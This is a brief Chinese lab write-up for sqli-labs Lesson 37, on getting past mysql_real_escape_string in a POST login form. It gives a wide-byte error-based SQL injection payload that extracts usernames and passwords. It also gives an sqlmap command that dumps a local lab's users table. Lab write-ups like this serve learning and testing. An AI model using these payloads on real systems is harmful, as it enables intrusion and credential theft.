---
title: sqli-labs lession-37 POST-绕过Mysql-real-escape-string
date: 2018-10-16 00:28:50
tags: [sqli-labs]
categories: sql注入
---

# sqli-labs lession-37 POST-绕过Mysql-real-escape-string

---

## 登录界面

![001](/img/sql/Lesson-37/001.png)

## 分析

{% post_link sqli-labs-lession-36-GET-绕过Mysql-real-escape-string 点击查看Lesson-36%}

## 过程

这一课的payload和Lesson-34一模一样,就不贴过程了

`uname=admin1%df'and extractvalue(null,concat(0x7e,(select concat(username,password) from users limit 0,1),0x7e))%23&passwd=123&submit=Submit`

![001](/img/sql/Lesson-38/001.png)



## SQLMAP

和Lesson-34一模一样。

`sqlmap -u "http://192.168.75.132/sql/Less-37/" --data "uname=admin'&passwd=123&submit=Submit" -p uname --method POST --dbms mysql --threads 32 --technique E --tamper unmagicquotes.py -D security -T users --columns --dump`

![002](/img/sql/Lesson-38/002.png)

![003](/img/sql/Lesson-38/003.png)

![004](/img/sql/Lesson-38/004.png)